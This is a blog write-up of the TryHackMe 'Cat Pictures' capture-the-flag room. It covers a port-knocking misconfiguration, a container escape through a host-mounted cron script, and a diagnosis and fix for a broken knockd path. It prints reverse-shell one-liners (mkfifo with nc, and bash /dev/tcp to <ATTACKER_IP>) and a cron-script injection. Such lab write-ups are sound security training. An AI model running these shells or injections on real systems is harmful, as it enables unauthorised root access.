@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Cat Pictures CTF &middot; Low Priv Notes
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/ctf/2026/06/24/cat-pictures-ctf/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>Notes, CTF writeups and security research. Focusing on alternative privilege escalation vectors.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+    <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Low Priv Notes</a>
+<br>            
+<small>Exploring alternative exploitation paths</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">Cat Pictures CTF</h1>
+  <span class="post-date">24 Jun 2026</span>
+  <h2 id="overview">Overview</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Platform</strong></td>
+      <td>TryHackMe</td>
+    </tr>
+    <tr>
+      <td><strong>Difficulty</strong></td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td><strong>URL</strong></td>
+      <td><a href="https://tryhackme.com/room/catpictures" target="_blank">https://tryhackme.com/room/catpictures</a></td>
+    </tr>
+    <tr>
+      <td><strong>Focus</strong></td>
+      <td>Port Knocking misconfiguration and container escape</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>This is a straightforward room. The goal is to get access to the target machine and escalate privileges to full control. No flags are discussed here — the focus is entirely on the exploitation techniques and understanding what went wrong with the defensive configuration.</p>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Quick port scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> &lt;TARGET_IP&gt;
+
+PORT     STATE    SERVICE      VERSION
+21/tcp   filtered ftp
+22/tcp   open     ssh          OpenSSH 8.2p1
+2375/tcp filtered docker
+4420/tcp open     nvm-express?
+8080/tcp open     http         Apache httpd 2.4.46
+</code></pre></div></div>
+
+<p>Three open ports, two filtered. The web server is phpBB. Port 4420 is an “Internal Shell Service” that requires a password. SSH is available but we need credentials first.</p>
+
+<hr />
+
+<h2 id="getting-in">Getting In</h2>
+
+<p>Browse to the phpBB forum. There’s a post that says:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST ALL YOUR CAT PICTURES HERE :)
+Knock knock! Magic numbers: 1111, 2222, 3333, 4444
+</code></pre></div></div>
+
+<p>This hints at Port Knocking. Try the sequence with knockit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 knockit.py <span class="nt">-d</span> 300 &lt;TARGET_IP&gt; 1111 2222 3333 4444 <span class="o">&amp;&amp;</span> <span class="nb">sleep </span>1 <span class="o">&amp;&amp;</span> nmap <span class="nt">-p21</span> &lt;TARGET_IP&gt;
+
+PORT   STATE    SERVICE
+21/tcp filtered ftp
+</code></pre></div></div>
+
+<p>The port is still filtered. Nothing happens. knockit doesn’t report errors — it just completes silently. This is frustrating. The sequence seems correct, but the port never opens.</p>
+
+<p>At this point, I have two options: spend hours debugging Port Knocking, or search online to see if anyone else hit this problem. I went with option 2. Turns out, other writeups mention that the password for port 4420 is <code class="language-plaintext highlighter-rouge">sardinethecat</code>. <a href="#port-knocking-investigation">I’ll investigate why Port Knocking failed later</a> — first, let me get in.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;TARGET_IP&gt; 4420
+
+INTERNAL SHELL SERVICE
+Please enter password:
+sardinethecat
+Password accepted
+</code></pre></div></div>
+
+<p>I’m in, but the shell is extremely limited — only <code class="language-plaintext highlighter-rouge">ls</code>, <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">touch</code>, and <code class="language-plaintext highlighter-rouge">mkfifo</code> work. Get a proper bash shell with the mkfifo reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/bash <span class="nt">-i</span> 2&gt;&amp;1 | nc &lt;ATTACKER_IP&gt; 4545 <span class="o">&gt;</span> /tmp/f
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="finding-ssh-credentials">Finding SSH Credentials</h2>
+
+<p>There’s a binary called <code class="language-plaintext highlighter-rouge">runme</code> in <code class="language-plaintext highlighter-rouge">/home/catlover/</code>. Copy it to your attacker machine and examine it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings runme | <span class="nb">grep</span> <span class="nt">-iE</span> <span class="s2">"password|ssh|rebecca"</span>
+
+rebecca
+Please enter yout password:
+Welcome, catlover! SSH key transfer queued!
+<span class="nb">touch</span> /tmp/gibmethesshkey
+</code></pre></div></div>
+
+<p>The binary checks for <code class="language-plaintext highlighter-rouge">/tmp/gibmethesshkey</code> and asks for a password. If both conditions are met, it generates an SSH key:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> /tmp/gibmethesshkey
+/home/catlover/runme
+<span class="c"># Enter password: rebecca</span>
+
+<span class="nb">ls</span> <span class="nt">-l</span> /home/catlover
+<span class="nt">-rw-r--r--</span> 1 0 0 1675 id_rsa
+</code></pre></div></div>
+
+<p>Extract the key and SSH in:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa catlover@&lt;TARGET_IP&gt;
+
+root@7546fa2336d6:/#
+</code></pre></div></div>
+
+<p>I’m logged in as root. Something seems off with that hostname.</p>
+
+<hr />
+
+<h2 id="discovering-the-environment">Discovering the Environment</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /
+
+<span class="nt">-rwxr-xr-x</span> 1 root root 0 .dockerenv
+</code></pre></div></div>
+
+<p>That file shouldn’t be there. Check the mounted filesystems:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">df</span> <span class="nt">-h</span>
+
+/dev/xvda1       20G   11G  8.4G  55% /opt/clean
+</code></pre></div></div>
+
+<p>Wait — <code class="language-plaintext highlighter-rouge">/dev/xvda1</code> is the host’s disk, and it’s mounted here at <code class="language-plaintext highlighter-rouge">/opt/clean</code>. Let’s see what’s there:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/clean/clean.sh
+
+<span class="c">#!/bin/bash</span>
+<span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="k">*</span>
+</code></pre></div></div>
+
+<p>A cleanup script. Now check the crontab:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab
+
+<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root /bin/bash /opt/clean/clean.sh <span class="o">&gt;</span>/dev/null 2&gt;&amp;1
+</code></pre></div></div>
+
+<p><strong>This is the vulnerability.</strong> The script runs every 2 minutes as root. And we can modify it because we have write access to <code class="language-plaintext highlighter-rouge">/opt/clean</code>.</p>
+
+<p>Append a reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/8080 0&gt;&amp;1'</span> <span class="o">&gt;&gt;</span> /opt/clean/clean.sh
+</code></pre></div></div>
+
+<p>Set up a listener:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 8080
+</code></pre></div></div>
+
+<p>Wait up to 2 minutes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to <span class="o">[</span>&lt;ATTACKER_IP&gt;] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>&lt;TARGET_IP&gt;] 52174
+root@ip-10-128-184-85:~#
+</code></pre></div></div>
+
+<p>Root on the host. I’ve escaped.</p>
+
+<hr />
+
+<h2 id="port-knocking-investigation">The Interesting Part: Why Port Knocking Failed</h2>
+
+<p>Now that we have host access, let’s investigate the Port Knocking configuration. I tried knockit earlier and it did nothing. First, check the knockd config:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/knockd.conf
+
+<span class="o">[</span>options]
+        UseSyslog
+<span class="o">[</span>openFTP]
+        sequence    <span class="o">=</span> 1111,2222,3333,4444
+        seq_timeout <span class="o">=</span> 15
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-A</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 21 <span class="nt">-j</span> ACCEPT <span class="o">&amp;&amp;</span> iptables <span class="nt">-D</span> INPUT <span class="nt">-p</span> tcp <span class="nt">--dport</span> 21 <span class="nt">-j</span> REJECT
+        tcpflags    <span class="o">=</span> syn
+</code></pre></div></div>
+
+<p>The configuration looks correct. Now check the logs:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep </span>knockd /var/log/syslog | <span class="nb">tail</span> <span class="nt">-10</span>
+
+Jun 21 09:24:43 knockd: openFTP: Stage 1
+Jun 21 09:24:43 knockd: openFTP: Stage 2
+Jun 21 09:24:43 knockd: openFTP: Stage 3
+Jun 21 09:24:43 knockd: openFTP: Stage 4
+Jun 21 09:24:43 knockd: openFTP: OPEN SESAME
+Jun 21 09:24:43 knockd: sh: 1: /sbin/iptables: not found
+Jun 21 09:24:43 knockd: <span class="nb">command </span>returned non-zero status code <span class="o">(</span>127<span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>There it is.</strong> knockd detected the sequence perfectly (<code class="language-plaintext highlighter-rouge">OPEN SESAME</code>) but failed to execute the command because <code class="language-plaintext highlighter-rouge">/sbin/iptables</code> doesn’t exist.</p>
+
+<p>Check where iptables actually is:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which iptables
+/usr/sbin/iptables
+</code></pre></div></div>
+
+<p>In modern Ubuntu, <code class="language-plaintext highlighter-rouge">iptables</code> moved from <code class="language-plaintext highlighter-rouge">/sbin/</code> to <code class="language-plaintext highlighter-rouge">/usr/sbin/</code>. The knockd config is old and hardcoded to the wrong path. The binary path is incorrect, so the command fails silently.</p>
+
+<h3 id="why-this-matters">Why This Matters</h3>
+
+<p>From the attacker’s perspective, <strong>nothing happened</strong>. knockit completed without errors, nmap showed the port still filtered, no error messages anywhere. The failure was completely invisible on the outside. You only find it by reading <code class="language-plaintext highlighter-rouge">/var/log/syslog</code> and looking for exit code 127 (command not found).</p>
+
+<p>This is a <strong>silent misconfiguration</strong> — the kind that breaks in production and nobody knows why.</p>
+
+<h3 id="the-fix">The Fix</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s|/sbin/iptables|/usr/sbin/iptables|g'</span> /etc/knockd.conf
+killall knockd
+/usr/sbin/knockd <span class="nt">-i</span> eth0
+</code></pre></div></div>
+
+<p>Now test it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 knockit.py <span class="nt">-d</span> 300 &lt;TARGET_IP&gt; 1111 2222 3333 4444 <span class="o">&amp;&amp;</span> <span class="nb">sleep </span>1 <span class="o">&amp;&amp;</span> nmap <span class="nt">-p21</span> &lt;TARGET_IP&gt;
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+</code></pre></div></div>
+
+<p>Port 21 opens immediately. One line fix. Massive impact.</p>
+
+<hr />
+
+<h2 id="attack-flow">Attack Flow</h2>
+
+<div class="mermaid">
+graph TD
+    A["nmap scan"] --&gt; B["Port 8080<br />phpBB forum"]
+    B --&gt; C["Post hint<br />Port Knocking 1111 2222 3333 4444"]
+    C --&gt; D["knockit attempt<br />fails silently"]
+    D --&gt; E["External research<br />password sardinethecat"]
+    E --&gt; F["Port 4420 shell<br />limited environment"]
+    F --&gt; G["Reverse shell<br />mkfifo to bash"]
+    G --&gt; H["Binary runme<br />strings analysis"]
+    H --&gt; I["SSH key generation<br />password rebecca"]
+    I --&gt; J["SSH login<br />second container as root"]
+    J --&gt; K["Discover /opt/clean<br />mounted from host"]
+    K --&gt; L["Cron job injection<br />reverse shell payload"]
+    L --&gt; M["Root on host<br />escape complete"]
+    M --&gt; N["Investigate knockd logs<br />find iptables path bug"]
+</div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<p><strong>Silent failures are the worst kind.</strong> Port Knocking worked perfectly from knockd’s perspective — it detected the sequence, logged success, executed the command… which failed to find a binary. From outside the server, it looks completely broken. Always check <code class="language-plaintext highlighter-rouge">/var/log/syslog</code> when something that should work doesn’t.</p>
+
+<p><strong>Configuration mistakes live forever.</strong> This config was probably written 5+ years ago for an older Ubuntu version. When the system updated, nobody updated the knockd config. Now it silently fails on every attempt. It’s a good reminder that hardcoded paths and old configurations need auditing.</p>
+
+<p><strong>Mounted directories from the host can be escape vectors.</strong> If you mount a directory and run something from it as root, the container can inject code that executes with host privileges. A simple <code class="language-plaintext highlighter-rouge">ro</code> (read-only) flag would have prevented this entirely.</p>
+
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/ctf/web/2026/07/10/blog/">
+            Blog
+            <small>10 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/ctf/2026/07/08/watcher/">
+            Watcher
+            <small>08 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/websec/2026/07/07/username-enumeration-timing/">
+            Username Enumeration via Response Timing
+            <small>07 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script src='/public/js/script.js'></script>
+  </body>
+</html>
